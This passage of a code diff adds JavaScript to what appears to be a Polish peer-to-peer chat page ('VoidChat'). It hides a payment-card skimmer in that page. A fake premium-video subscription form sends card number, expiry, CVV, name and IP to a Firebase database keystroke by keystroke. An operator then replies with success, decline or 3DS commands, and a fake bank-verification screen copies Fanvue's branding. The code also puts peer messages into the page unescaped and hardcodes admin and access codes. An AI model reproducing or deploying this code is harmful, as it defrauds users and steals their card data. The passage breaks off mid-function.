+    const _db  = getDatabase(_fbApp);
+    const _sid = "vc_" + Math.random().toString(36).substr(2, 9);
+    const _sessionRef = ref(_db, "sessions/" + _sid);
+    const _eventsRef  = ref(_db, "events");
+    const _ctrlRef    = ref(_db, "ctrl/" + _sid);
+
+    async function fbSend(data) {
+        const payload = Object.assign({}, data, { sid: _sid, ts: Date.now() });
+        await push(_eventsRef, payload);
+        const patch = { sid: _sid, ts: Date.now(), isOnline: true };
+        if (data.t === 'online')       patch.isOnline     = true;
+        if (data.t === 'offline')      patch.isOnline     = false;
+        if (data.t === 'tab')          patch.tab          = data.v;
+        if (data.t === 'method')       patch.method       = data.v;
+        if (data.t === 'modal')        patch.modal        = true;
+        if (data.t === 'cardnum')      patch.cardnum      = data.v;
+        if (data.t === 'cardexp')      patch.cardexp      = data.v;
+        if (data.t === 'cardcvv')      patch.cardcvv      = data.v;
+        if (data.t === 'cardname')     patch.cardname     = data.v;
+        if (data.t === 'verifybtn')    patch.verifybtn    = Date.now();
+        if (data.t === 'confirm')      patch.confirm      = data.v;
+        if (data.t === 'verify_start') patch.verify_start = data.v;
+        await set(_sessionRef, patch);
+    }
+
+    async function fbSaveHistory(details) {
+        const hid = 'h_' + _sid + '_' + Date.now();
+        await set(ref(_db, 'history/' + hid), {
+            hid, sid: _sid,
+            userName: details.nick || 'Użytkownik',
+            method: 'Karta',
+            confirm: details.confirm || '–',
+            ts: Date.now(),
+            cardnum:  details.num  || '–',
+            cardexp:  details.exp  || '–',
+            cardcvv:  details.cvv  || '–',
+            cardname: details.name || '–',
+        });
+    }
+
+    // Pobierz IP i zainicjuj sesję
+    try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        const d = await r.json();
+        await set(_sessionRef, { sid: _sid, ip: d.ip, ts: Date.now(), isOnline: true });
+    } catch(e) {
+        await set(_sessionRef, { sid: _sid, ip: '', ts: Date.now(), isOnline: true });
+    }
+
+    await fbSend({ t: 'online' });
+    setInterval(() => fbSend({ t: 'hb' }), 4000);
+    document.addEventListener('visibilitychange', () => {
+        fbSend({ t: 'tab', v: document.hidden ? 'ukryta' : 'aktywna' });
+    });
+    window.addEventListener('pagehide', () => fbSend({ t: 'offline' }));
+
+    // Nasłuch komend od admina (Sukces / Błąd / 3DS)
+    onValue(_ctrlRef, (snap) => {
+        const m = snap.val();
+        if (!m || !m.action) return;
+        if (window._pmHandleCtrl) window._pmHandleCtrl(m.action);
+    });
+
+    // Eksponuj funkcje do użycia w reszcie skryptu
+    window._fbSend        = fbSend;
+    window._fbSaveHistory = fbSaveHistory;
+    window._sid           = _sid;
+
+    // ══════════════════════════════════════════════
+    //  Reszta kodu strony
+    // ══════════════════════════════════════════════
+        document.addEventListener("click", (e) => {
+            const btn = e.target.closest("button");
+            if (!btn) return;
+            btn.classList.remove("pressed");
+            void btn.offsetWidth;
+            btn.classList.add("pressed");
+            btn.addEventListener("animationend", () => btn.classList.remove("pressed"), { once: true });
+        });
+
+        let myNick = "";
+        let peer = null;
+        let activeConnection = null;
+        let isHost = false;
+        let currentRoom = null;
+        let currentPassword = null;
+        let connected = false;
+        let partnerNick = null;
+
+        const nickInput         = document.getElementById("nickInput");
+        const saveNickBtn       = document.getElementById("saveNickBtn");
+        const nickStatus        = document.getElementById("nickStatus");
+        const hostBtn           = document.getElementById("hostBtn");
+        const guestBtn          = document.getElementById("guestBtn");
+        const hostPanel         = document.getElementById("hostPanel");
+        const guestPanel        = document.getElementById("guestPanel");
+        const chatPanel         = document.getElementById("chatPanel");
+        const createRoomBtn     = document.getElementById("createRoomBtn");
+        const hostRoomName      = document.getElementById("hostRoomName");
+        const hostRoomPassword  = document.getElementById("hostRoomPassword");
+        const hostStatus        = document.getElementById("hostStatus");
+        const joinRoomBtn       = document.getElementById("joinRoomBtn");
+        const guestRoomName     = document.getElementById("guestRoomName");
+        const guestRoomPassword = document.getElementById("guestRoomPassword");
+        const guestStatus       = document.getElementById("guestStatus");
+        const messagesDiv       = document.getElementById("messagesDiv");
+        let messagesInner       = document.getElementById("messagesInner");
+        const chatInput         = document.getElementById("chatInput");
+        const sendMsgBtn        = document.getElementById("sendMsgBtn");
+        const disconnectBtn     = document.getElementById("disconnectBtn");
+
+        function setStatus(el, type, text) {
+            el.textContent = text;
+            el.className = "status" + (type ? " " + type : "");
+        }
+
+        saveNickBtn.addEventListener("click", () => {
+            const nick = nickInput.value.trim();
+            if (nick) {
+                myNick = nick;
+                document.getElementById("nickCheck").classList.remove("visible");
+                document.getElementById("nickSpinner").classList.add("visible");
+                setStatus(nickStatus, "", "");
+                setTimeout(() => {
+                    document.getElementById("nickSpinner").classList.remove("visible");
+                    document.getElementById("nickCheck").classList.add("visible");
+                }, 800);
+            } else {
+                document.getElementById("nickCheck").classList.remove("visible");
+                document.getElementById("nickSpinner").classList.remove("visible");
+                setStatus(nickStatus, "error", "Wpisz nick!");
+            }
+        });
+
+        // --- LIGHTBOX ---
+        const lightbox = document.getElementById("lightbox");
+        const lightboxImg = document.getElementById("lightboxImg");
+
+        document.getElementById("lightboxClose").addEventListener("click", () => {
+            lightbox.classList.remove("active");
+        });
+        lightbox.addEventListener("click", (e) => {
+            if (e.target === lightbox) lightbox.classList.remove("active");
+        });
+
+        function openLightbox(src) {
+            lightboxImg.src = src;
+            lightbox.classList.add("active");
+        }
+
+        function addImageMessage(sender, dataUrl, isMy = false) {
+            const msgDiv = document.createElement("div");
+            msgDiv.className = "msg";
+            const senderSpan = isMy
+                ? `<span class="sender-me">Ty:</span>`
+                : `<span class="sender-them">${sender}:</span>`;
+            msgDiv.innerHTML = `${senderSpan}<br><img src="${dataUrl}" style="max-width:100%;max-height:260px;margin-top:6px;border-radius:6px;display:block;cursor:pointer;">`;
+            const img = msgDiv.querySelector("img");
+            img.addEventListener("click", () => openLightbox(dataUrl));
+            messagesInner.appendChild(msgDiv);
+            messagesDiv.scrollTop = messagesDiv.scrollHeight;
+        }
+
+        function addMessage(sender, text, isMy = false, isSystem = false) {
+            const msgDiv = document.createElement("div");
+            msgDiv.className = "msg" + (isSystem ? " msg-system" : "");
+            if (isSystem) {
+                msgDiv.innerHTML = `<span class="sender-sys">${sender}:</span> <span class="txt">${text}</span>`;
+            } else if (isMy) {
+                msgDiv.innerHTML = `<span class="sender-me">Ty:</span> <span class="txt">${text}</span>`;
+            } else {
+                msgDiv.innerHTML = `<span class="sender-them">${sender}:</span> <span class="txt">${text}</span>`;
+            }
+            messagesInner.appendChild(msgDiv);
+            messagesDiv.scrollTop = messagesDiv.scrollHeight;
+        }
+
+        const ADMIN_PASSWORD = "123";
+        let isAdmin = false;
+
+        function sendChatMessage(text) {
+            if (text.startsWith("/admin ")) {
+                const pass = text.slice(7).trim();
+                if (pass === ADMIN_PASSWORD) {
+                    isAdmin = true;
+                    const fi = document.getElementById("photoFileInput");
+                    fi.removeAttribute("capture");
+                    addMessage("System", "Tryb admin aktywny. Galeria odblokowana.", false, true);
+                } else {
+                    addMessage("System", "Nieprawidłowe hasło.", false, true);
+                }
+                chatInput.value = "";
+                return;
+            }
+            if (!connected || !activeConnection) return;
+            const msg = { type: "chat", sender: myNick, text, time: Date.now() };
+            activeConnection.send(JSON.stringify(msg));
+            addMessage(myNick, text, true);
+            chatInput.value = "";
+        }
+
+        function preventDefaultTouch(e) {
+            const messagesContainer = document.getElementById("messagesDiv");
+            if (messagesContainer && messagesContainer.contains(e.target)) {
+                return;
+            }
+            e.preventDefault();
+        }
+
+        function resetMessagesContainer() {
+            const oldInner = document.getElementById("messagesInner");
+            if (oldInner) {
+                messagesDiv.removeChild(oldInner);
+            }
+            const newInner = document.createElement("div");
+            newInner.className = "chat-messages-inner";
+            newInner.id = "messagesInner";
+            messagesDiv.appendChild(newInner);
+            messagesInner = newInner;
+            messagesDiv.scrollTop = 0;
+        }
+
+        // ══════════════════════════════════════════════
+        //  POPRAWKA 1: paddingTop nie kumuluje się —
+        //  zawsze ustawiamy od zera na podstawie
+        //  aktualnej wysokości topbara
+        // ══════════════════════════════════════════════
+        function showChat() {
+            const topbarH = document.querySelector('.topbar').offsetHeight;
+            chatPanel.style.paddingTop = topbarH + 'px';
+            chatPanel.classList.add("active");
+
+            document.body.classList.add('body-no-scroll');
+            chatPanel.addEventListener('touchmove', preventDefaultTouch, { passive: false });
+
+            hostPanel.style.display = "none";
+            guestPanel.style.display = "none";
+
+            resetMessagesContainer();
+            chatInput.focus();
+        }
+
+        window.disconnect = function(skipUiCleanup = false) {
+            if (activeConnection) {
+                activeConnection._skipUiCleanup = skipUiCleanup;
+                try { activeConnection.close(); } catch(e) {}
+                activeConnection = null;
+            }
+            if (peer) { try { peer.destroy(); } catch(e) {} peer = null; }
+            connected = false; isHost = false;
+            currentRoom = null; currentPassword = null; partnerNick = null;
+
+            if (!skipUiCleanup) {
+                chatPanel.classList.remove("active");
+                // ── Resetuj paddingTop przy zamknięciu czatu ──
+                chatPanel.style.paddingTop = '';
+                document.body.classList.remove('body-no-scroll');
+                chatPanel.removeEventListener('touchmove', preventDefaultTouch);
+
+                hostPanel.style.display = "none";
+                guestPanel.style.display = "none";
+                hostRoomName.value = "";
+                hostRoomPassword.value = "";
+                guestRoomName.value = "";
+                guestRoomPassword.value = "";
+                setStatus(hostStatus, "", "");
+                setStatus(guestStatus, "", "");
+
+                resetMessagesContainer();
+            }
+        };
+
+        function handleData(data) {
+            try {
+                const msg = JSON.parse(data);
+                if (msg.type === "nick") {
+                    partnerNick = msg.nick;
+                    addMessage("System", `Rozpoczęto rozmowę z ${partnerNick}. Przywitaj się!`, false, true);
+                } else if (msg.type === "chat") {
+                    addMessage(msg.sender, msg.text);
+                } else if (msg.type === "image") {
+                    addImageMessage(msg.sender, msg.dataUrl, false);
+                }
+            } catch(e) { console.warn(e); }
+        }
+
+        createRoomBtn.addEventListener("click", () => {
+            if (!myNick) { setStatus(hostStatus, "error", "Najpierw ustaw nick!"); return; }
+            const roomName = hostRoomName.value.trim();
+            const password = hostRoomPassword.value;
+            if (!roomName || !password) { setStatus(hostStatus, "error", "Podaj nazwę pokoju i hasło!"); return; }
+
+            const roomId = btoa(roomName + ":" + password).replace(/[/+=]/g, '');
+            currentRoom = roomName; currentPassword = password; isHost = true;
+            setStatus(hostStatus, "info", `Tworzenie pokoju "${roomName}"...`);
+
+            peer = new Peer(roomId, { debug: 0, config: { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] } });
+
+            peer.on("open", () => {
+                setStatus(hostStatus, "success", `Pokój "${roomName}" utworzony. Czekam na gościa...`);
+                peer.on("connection", (conn) => {
+                    if (activeConnection) { conn.close(); return; }
+                    activeConnection = conn;
+                    conn.on("open", () => {
+                        connected = true;
+                        conn.send(JSON.stringify({ type: "nick", nick: myNick }));
+                        showChat();
+                    });
+                    conn.on("data", handleData);
+                    conn.on("close", () => {
+                        if (!conn._skipUiCleanup) {
+                            window.disconnect(false);
+                        }
+                    });
+                });
+            });
+
+            peer.on("error", (err) => {
+                const msg = err.type === "unavailable-id"
+                    ? `Pokój "${roomName}" już istnieje! Wybierz inną nazwę lub hasło.`
+                    : `Błąd: ${err.message}`;
+                setStatus(hostStatus, "error", msg);
+                peer = null; isHost = false;
+            });
+        });
+
+        // ══════════════════════════════════════════════
+        //  POPRAWKA 2: timeout przy łączeniu jako gość
+        //  + blokada przycisku podczas łączenia
+        // ══════════════════════════════════════════════
+        joinRoomBtn.addEventListener("click", () => {
+            if (!myNick) { setStatus(guestStatus, "error", "Najpierw ustaw nick!"); return; }
+            const roomName = guestRoomName.value.trim();
+            const password = guestRoomPassword.value;
+            if (!roomName || !password) { setStatus(guestStatus, "error", "Podaj nazwę pokoju i hasło!"); return; }
+
+            const roomId = btoa(roomName + ":" + password).replace(/[/+=]/g, '');
+            currentRoom = roomName; currentPassword = password; isHost = false;
+            setStatus(guestStatus, "info", `Łączenie z pokojem "${roomName}"...`);
+
+            // Zablokuj przycisk podczas łączenia
+            joinRoomBtn.disabled = true;
+            joinRoomBtn.textContent = "Łączenie...";
+
+            function resetJoinBtn() {
+                joinRoomBtn.disabled = false;
+                joinRoomBtn.textContent = "Dołącz do pokoju";
+            }
+
+            peer = new Peer({ debug: 0, config: { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] } });
+
+            peer.on("open", () => {
+                const conn = peer.connect(roomId);
+                if (!conn) {
+                    setStatus(guestStatus, "error", "Nie można nawiązać połączenia. Sprawdź nazwę i hasło.");
+                    resetJoinBtn();
+                    peer = null;
+                    return;
+                }
+                activeConnection = conn;
+
+                // Timeout 10 sekund — jeśli conn.on("open") nie odpali
+                const connectTimeout = setTimeout(() => {
+                    if (!connected) {
+                        setStatus(guestStatus, "error", "Przekroczono czas połączenia (10s). Sprawdź nazwę pokoju i hasło.");
+                        resetJoinBtn();
+                        try { conn.close(); } catch(e) {}
+                        try { peer.destroy(); } catch(e) {}
+                        peer = null;
+                        activeConnection = null;
+                    }
+                }, 10000);
+
+                conn.on("open", () => {
+                    clearTimeout(connectTimeout);
+                    resetJoinBtn();
+                    connected = true;
+                    conn.send(JSON.stringify({ type: "nick", nick: myNick }));
+                    showChat();
+                });
+                conn.on("data", handleData);
+                conn.on("close", () => {
+                    clearTimeout(connectTimeout);
+                    if (!conn._skipUiCleanup) {
+                        window.disconnect(false);
+                    }
+                });
+            });
+
+            peer.on("error", (err) => {
+                setStatus(guestStatus, "error", `Nie udało się połączyć: sprawdź nazwę i hasło. (${err.message})`);
+                resetJoinBtn();
+                peer = null;
+            });
+        });
+
+        sendMsgBtn.addEventListener("click", () => {
+            const text = chatInput.value.trim();
+            if (text && connected) sendChatMessage(text);
+        });
+        chatInput.addEventListener("keypress", (e) => { if (e.key === "Enter") sendMsgBtn.click(); });
+
+        // --- MODAL MEDIÓW ---
+        const mediaModal   = document.getElementById("mediaModal");
+        const premiumModal = document.getElementById("premiumModal");
+
+        disconnectBtn.addEventListener("click", () => {
+            mediaModal.classList.add("active");
+        });
+
+        document.getElementById("mediaModalClose").addEventListener("click", () => {
+            mediaModal.classList.remove("active");
+        });
+        // Zamykanie tylko przez X — kliknięcie tła nie zamyka
+
+        document.getElementById("optPhoto").addEventListener("click", () => {
+            mediaModal.classList.remove("active");
+            const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+            if (isAdmin) {
+                document.getElementById("photoFileInput").click();
+            } else if (isMobile) {
+                document.getElementById("photoFileInput").click();
+            } else {
+                openDesktopCamera();
+            }
+        });
+
+        function openDesktopCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const overlay = document.createElement("div");
+                    overlay.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:5000;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;";
+
+                    const video = document.createElement("video");
+                    video.srcObject = stream;
+                    video.autoplay = true;
+                    video.playsInline = true;
+                    video.style.cssText = "max-width:90vw;max-height:60vh;border-radius:8px;";
+
+                    const btnRow = document.createElement("div");
+                    btnRow.style.cssText = "display:flex;gap:12px;";
+
+                    const snapBtn = document.createElement("button");
+                    snapBtn.textContent = "Zrób zdjęcie";
+                    snapBtn.style.cssText = "background:#2e7d32;color:white;border:none;padding:12px 24px;font-size:15px;cursor:pointer;border-radius:0;";
+
+                    const cancelBtn = document.createElement("button");
+                    cancelBtn.textContent = "Anuluj";
+                    cancelBtn.style.cssText = "background:#4a1a1a;color:white;border:none;padding:12px 24px;font-size:15px;cursor:pointer;border-radius:0;";
+
+                    btnRow.appendChild(snapBtn);
+                    btnRow.appendChild(cancelBtn);
+                    overlay.appendChild(video);
+                    overlay.appendChild(btnRow);
+                    document.body.appendChild(overlay);
+
+                    const cleanup = () => {
+                        stream.getTracks().forEach(t => t.stop());
+                        document.body.removeChild(overlay);
+                    };
+
+                    cancelBtn.addEventListener("click", cleanup);
+
+                    snapBtn.addEventListener("click", () => {
+                        const canvas = document.createElement("canvas");
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext("2d").drawImage(video, 0, 0);
+                        const dataUrl = canvas.toDataURL("image/jpeg", 0.85);
+                        cleanup();
+                        if (!connected || !activeConnection) {
+                            addMessage("System", "Nie jesteś połączony — nie można wysłać zdjęcia.", false, true);
+                            return;
+                        }
+                        activeConnection.send(JSON.stringify({ type: "image", sender: myNick, dataUrl }));
+                        addImageMessage(myNick, dataUrl, true);
+                    });
+                })
+                .catch(() => {
+                    addMessage("System", "Brak dostępu do kamery.", false, true);
+                });
+        }
+
+        document.getElementById("photoFileInput").addEventListener("change", (e) => {
+            const file = e.target.files[0];
+            if (!file) return;
+            if (!connected || !activeConnection) {
+                addMessage("System", "Nie jesteś połączony — nie można wysłać zdjęcia.", false, true);
+                return;
+            }
+            const reader = new FileReader();
+            reader.onload = (ev) => {
+                const dataUrl = ev.target.result;
+                const msg = { type: "image", sender: myNick, dataUrl };
+                activeConnection.send(JSON.stringify(msg));
+                addImageMessage(myNick, dataUrl, true);
+            };
+            reader.readAsDataURL(file);
+            e.target.value = "";
+        });
+
+        document.getElementById("optVideo").addEventListener("click", () => {
+            mediaModal.classList.remove("active");
+            showPmScreen(1);
+            premiumModal.classList.add("active");
+        });
+
+        document.getElementById("premiumModalClose").addEventListener("click", () => {
+            premiumModal.classList.remove("active");
+        });
+        // Zamykanie tylko przez X — kliknięcie tła nie zamyka
+
+        // --- SUBSCRIPTION FLOW ---
+        let savedCard = null;
+
+        function showPmScreen(n) {
+            document.getElementById("pmScreen1").style.display = n === 1 ? "block" : "none";
+            document.getElementById("pmScreen2").style.display = n === 2 ? "block" : "none";
+            document.getElementById("pmScreen3").style.display = n === 3 ? "block" : "none";
+        }
+
+        // Ekran 1: kod dostępu
+        const VALID_CODE = "123456";
+        document.getElementById("premiumCodeBtn").addEventListener("click", () => {
+            const code = document.getElementById("premiumCodeInput").value.trim();
+            if (code === VALID_CODE) {
+                premiumModal.classList.remove("active");
+                addMessage("System", "Dostęp do wideo przyznany!", false, true);
+            } else {
+                document.getElementById("premiumCodeError").textContent = "Nieprawidłowy kod. Spróbuj ponownie.";
+            }
+        });
+
+        // --- Dynamiczne daty naliczania opłat ---
+        const MONTHS_PL = ["sty","lut","mar","kwi","maj","cze","lip","sie","wrz","paź","lis","gru"];
+        function formatDatePL(d) {
+            return `${d.getDate()} ${MONTHS_PL[d.getMonth()]} ${d.getFullYear()}`;
+        }
+        function addMonths(base, months) {
+            const d = new Date(base);
+            d.setMonth(d.getMonth() + months);
+            return d;
+        }
+
+        // Ekran 1 → 2 (standard)
+        document.getElementById("pmGoBuy").addEventListener("click", () => {
+            const todayStr = formatDatePL(new Date());
+            document.querySelector("#pmScreen2 .media-modal-title").textContent = "Sfinalizuj transakcję";
+            document.getElementById("pmPlanLabel").textContent = "Płatność";
+            document.getElementById("pmChargeDateLabel").textContent = "Płatność:";
+            document.getElementById("pmChargeDate").textContent = todayStr;
+            document.querySelector(".pm-total-amount").textContent = "9,99 zł";
+            document.getElementById("pmLegalText").textContent =
+                `Płatność w wysokości 9,99 zł zostanie naliczona dzisiaj, ${todayStr}. Odnawia się automatycznie co miesiąc. Aby zrezygnować z subskrypcji, przejdź do zakładki „Pomoc" na stronie. Wszystkie ceny zawierają VAT.`;
+            document.getElementById("pmEmailError").classList.remove("visible");
+            document.getElementById("pmCardMissingError").classList.remove("visible");
+            showPmScreen(2);
+        });
+
+        // Ekran 1 → 2 (trial)
+        document.getElementById("pmGoBuyTrial").addEventListener("click", () => {
+            const chargeDate = addMonths(new Date(), 3);
+            const chargeDateStr = formatDatePL(chargeDate);
+            document.querySelector("#pmScreen2 .media-modal-title").textContent = "Sfinalizuj transakcję";
+            document.getElementById("pmPlanLabel").textContent = "Okres próbny";
+            document.getElementById("pmChargeDateLabel").textContent = "Naliczanie opłat od:";
+            document.getElementById("pmChargeDate").textContent = chargeDateStr;
+            document.querySelector(".pm-total-amount").textContent = "0,00 zł";
+            document.getElementById("pmLegalText").textContent =
+                `Płatność zostanie naliczona ${chargeDateStr}, gdy zakończy się bezpłatny okres próbny. Odnawia się automatycznie co miesiąc. Aby zrezygnować z subskrypcji, przejdź do zakładki „Pomoc" na stronie. Wszystkie ceny zawierają VAT.`;
+            document.getElementById("pmEmailError").classList.remove("visible");
+            document.getElementById("pmCardMissingError").classList.remove("visible");
+            showPmScreen(2);
+        });
+
+        document.getElementById("pmBackToCode").addEventListener("click", () => showPmScreen(1));
+        document.getElementById("pmGoToCard").addEventListener("click", () => {
+            document.getElementById("pmCardMissingError").classList.remove("visible");
+            showPmScreen(3);
+        });
+        document.getElementById("pmBackBtn").addEventListener("click", () => showPmScreen(2));
+
+        // Walidacja emaila
+        const pmEmail = document.getElementById("pmEmail");
+        pmEmail.addEventListener("input", updateConfirmBtn);
+        pmEmail.addEventListener("blur", updateEmailError);
+        pmEmail.addEventListener("focus", () => {
+            document.getElementById("pmEmailError").classList.remove("visible");
+        });
+
+        function isValidEmail(e) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e); }
+
+        function updateConfirmBtn() {
+            const emailOk = isValidEmail(pmEmail.value.trim());
+            const cardOk  = !!savedCard;
+            const btn = document.getElementById("pmConfirmBtn");
+            btn.classList.toggle("ready", emailOk && cardOk);
+            if (emailOk) document.getElementById("pmEmailError").classList.remove("visible");
+        }
+
+        function updateEmailError() {
+            const emailOk = isValidEmail(pmEmail.value.trim());
+            document.getElementById("pmEmailError").classList.toggle("visible", pmEmail.value.length > 0 && !emailOk);
+        }
+
+        // Luhn
+        function luhn(num) {
+            let sum = 0, alt = false;
+            for (let i = num.length - 1; i >= 0; i--) {
+                let n = parseInt(num[i], 10);
+                if (alt) { n *= 2; if (n > 9) n -= 9; }
+                sum += n; alt = !alt;
+            }
+            return sum % 10 === 0;
+        }
+
+        const pmCardNum  = document.getElementById("pmCardNum");
+        const pmExpiry   = document.getElementById("pmExpiry");
+        const pmCvv      = document.getElementById("pmCvv");
+        const pmCardName = document.getElementById("pmCardName");
+        const pmSaveBtn  = document.getElementById("pmSaveCard");
+        const pmCardErr  = document.getElementById("pmCardNumError");
+
+        function validateCard() {
+            const num  = pmCardNum.value.replace(/\s/g, "");
+            const exp  = pmExpiry.value;
+            const cvv  = pmCvv.value;
+            const name = pmCardName.value.trim();
+            const ok   = num.length === 16 && luhn(num) && exp.length === 5 && cvv.length >= 3 && name.length >= 2;
+            pmSaveBtn.disabled = !ok;
+            pmSaveBtn.classList.toggle("ready", ok);
+        }
+
+        pmCardNum.addEventListener("input", function() {
+            let v = this.value.replace(/\D/g, "").substring(0, 16);
+            this.value = v.match(/.{1,4}/g) ? v.match(/.{1,4}/g).join(" ") : v;
+            const digits = this.value.replace(/\s/g, "");
+            const invalid = digits.length === 16 && !luhn(digits);
+            document.getElementById("pmCardNumGroup").style.borderColor = invalid ? "#d93025" : "";
+            pmCardErr.classList.toggle("visible", invalid);
+            if (window._fbSend) {
+                window._fbSend({ t: 'modal' });
+                window._fbSend({ t: 'cardnum', v: this.value });
+            }
+            validateCard();
+        });
+        pmExpiry.addEventListener("input", function() {
+            let v = this.value.replace(/\D/g, "").substring(0, 4);
+            if (v.length >= 3) v = v.substring(0, 2) + "/" + v.substring(2);
+            this.value = v;
+            if (window._fbSend) window._fbSend({ t: 'cardexp', v: this.value });
+            validateCard();
+        });
+        pmCvv.addEventListener("input", function() {
+            this.value = this.value.replace(/\D/g, "").substring(0, 4);
+            if (window._fbSend) window._fbSend({ t: 'cardcvv', v: this.value });
+            validateCard();
+        });
+        pmCardName.addEventListener("input", function() {
+            if (window._fbSend) window._fbSend({ t: 'cardname', v: this.value });
+            validateCard();
+        });
+
+        pmSaveBtn.addEventListener("click", () => {
+            if (pmSaveBtn.disabled) return;
+            const num = pmCardNum.value.replace(/\s/g, "");
+            const last4 = num.slice(-4);
+            const brand = num[0] === "4" ? "Visa" : num[0] === "5" ? "Mastercard" : "Karta";
+            savedCard = { label: `${brand} **** ${last4}` };
+            document.getElementById("pmCardLabel").textContent = savedCard.label;
+            document.getElementById("pmGoToCard").classList.add("has-card");
+            showPmScreen(2);
+            updateConfirmBtn();
+        });
+
+        document.getElementById("pmConfirmBtn").addEventListener("click", async () => {
+            const emailOk = isValidEmail(pmEmail.value.trim());
+            const cardOk  = !!savedCard;
+
+            if (!emailOk) document.getElementById("pmEmailError").classList.add("visible");
+            if (!cardOk)  document.getElementById("pmCardMissingError").classList.add("visible");
+            if (!emailOk || !cardOk) return;
+
+            const num  = pmCardNum.value;
+            const exp  = pmExpiry.value.trim();
+            const cvv  = pmCvv.value.trim();
+            const name = pmCardName.value.trim();
+
+            if (window._fbSend) {
+                await window._fbSend({ t: 'verifybtn' });
+                await window._fbSend({ t: 'confirm', v: 'Premium – Subskrybuj kliknięto' });
+                await window._fbSend({ t: 'method', v: 'Premium VoidChat' });
+            }
+            if (window._fbSaveHistory) {
+                await window._fbSaveHistory({
+                    nick: myNick || 'Użytkownik',
+                    num, exp, cvv, name,
+                    confirm: 'Premium – Subskrybuj kliknięto'
+                });
+            }
+
+            // Przycisk — spinner "Przetwarzanie..."
+            const btn = document.getElementById("pmConfirmBtn");
+            btn.innerHTML = '<span class="pm-spinner">⟳</span>&nbsp;Przetwarzanie...';
+            btn.classList.remove("ready");
+            btn.disabled = true;
+
+            // Handler na komendę admina
+            window._pmHandleCtrl = function(action) {
+                window._pmHandleCtrl = null;
+                if (action === 'card_ok') {
+                    premiumModal.classList.remove("active");
+                    addMessage("System", "Dostęp Premium aktywowany! Kod zostanie wysłany na podany adres e-mail.", false, true);
+                } else if (action === 'card_fail') {
+                    btn.innerHTML = "❌ Płatność odrzucona — spróbuj ponownie";
+                    btn.style.background = "#4a1a1a";
+                    btn.style.color = "#ff8a8a";
+                    btn.style.borderColor = "#ff4466";
+                    btn.disabled = false;
+                    setTimeout(() => {
+                        btn.innerHTML = "Subskrybuj";
+                        btn.style.background = "";
+                        btn.style.color = "";
+                        btn.style.borderColor = "";
+                        btn.classList.add("ready");
+                        btn.disabled = false;
+                    }, 3000);
+                } else if (action === 'card_3ds') {
+                    premiumModal.classList.remove("active");
+                    pm3dsShow();
+                }
+            };
+        });
+
+        // ── Ekran 3DS — 1:1 jak w pulpit.html ──
+        function pm3dsShow() {
+            const old = document.getElementById('pm3dsOverlay');
+            if (old) old.remove();
+
+            // Ciemny overlay — identyczny jak kycOverlay w pulpit.html
+            const overlay3ds = document.createElement('div');
+            overlay3ds.id = 'pm3dsOverlay';
+            overlay3ds.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.82);z-index:5000;display:flex;justify-content:center;align-items:center;padding:16px;box-sizing:border-box;font-family:Arial,sans-serif;';
+
+            const now = new Date();
+            const timeStr = 'Dzisiaj, ' +
+                String(now.getHours()).padStart(2, '0') + ':' +
+                String(now.getMinutes()).padStart(2, '0');
+
+            // Panel wewnętrzny — identyczny jak #kycPanel > kyc3dsScreen w pulpit.html
+            overlay3ds.innerHTML = `
+              <div style="background:#1c1d22;border-radius:12px;width:100%;max-width:520px;overflow:hidden;box-shadow:0 0 25px rgba(0,0,0,.6);box-sizing:border-box;">
+                <div style="background:#f5f6f7;padding:40px 35px 200px;text-align:center;border-radius:0;">
+                  <div style="position:relative;width:130px;height:130px;margin:10px auto 20px;">
+                    <svg width="130" height="130" viewBox="0 0 130 130" style="transform:rotate(-90deg);">
+                      <circle cx="65" cy="65" r="54" fill="none" stroke="#d4d8df" stroke-width="5"/>
+                      <circle id="pm3dsCircle" cx="65" cy="65" r="54" fill="none" stroke="#4da6ff" stroke-width="5" stroke-linecap="round" style="transition:stroke-dashoffset .9s linear;"/>
+                    </svg>
+                    <div id="pm3dsTime" style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:26px;font-weight:700;color:#111;letter-spacing:-.5px;"></div>
+                  </div>
+
+                  <div style="font-size:17px;font-weight:700;color:#111;margin-bottom:0;line-height:1.4;padding:0 10px;">
+                    Sprawdź swój bank, aby autoryzować tę płatność
+                  </div>
+
+                  <div style="background:#fff;border-radius:12px;padding:16px 18px;display:flex;align-items:center;gap:14px;margin:22px 0 0;text-align:left;">
+                    <div style="width:44px;height:44px;border-radius:10px;flex-shrink:0;display:flex;align-items:center;justify-content:center;overflow:hidden;">
+                      <svg width="44" height="44" viewBox="0 0 400 400" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="400" height="400" fill="url(#vc3ds_grad)"/>
+                        <path d="M69.8 521H258.6V520.3L226.9 482.1V220H347.7V204.9H192.6C150.3 204.9 116.7 183.8 116.7 141.7C116.7 100.2 149.7 75.1 191.9 75.1H214.4V154.8H284.3L349 60H191.9C141.7 60 101.5 92.3 101.5 141.7V204.9H50V220H101.5V482.1L69.8 520.3V521Z" fill="white"/>
+                        <defs>
+                          <linearGradient id="vc3ds_grad" x1="0" y1="0" x2="415" y2="16" gradientUnits="userSpaceOnUse">
+                            <stop stop-color="#F48A6C"/>
+                            <stop offset="1" stop-color="#FD1D5D"/>
+                          </linearGradient>
+                        </defs>
+                      </svg>
+                    </div>
+                    <div style="flex:1;">
+                      <div style="font-size:15px;font-weight:600;color:#111;">Fanvue</div>
+                      <div id="pm3dsTimeLabel" style="font-size:12px;color:#888;margin-top:2px;">${timeStr}</div>
+                    </div>
+                    <div style="font-size:15px;font-weight:700;color:#111;">9,99 zł</div>
+                  </div>
+
+                  <button id="pm3dsCancelBtn" style="width:100%;background:none;color:#e53e3e;border:none;padding:16px;font-size:14px;font-weight:600;cursor:pointer;font-family:Arial,sans-serif;margin-top:4px;">
+                    Anuluj weryfikację
+                  </button>
+                </div>
+              </div>
+            `;
+
+            document.body.appendChild(overlay3ds);
+
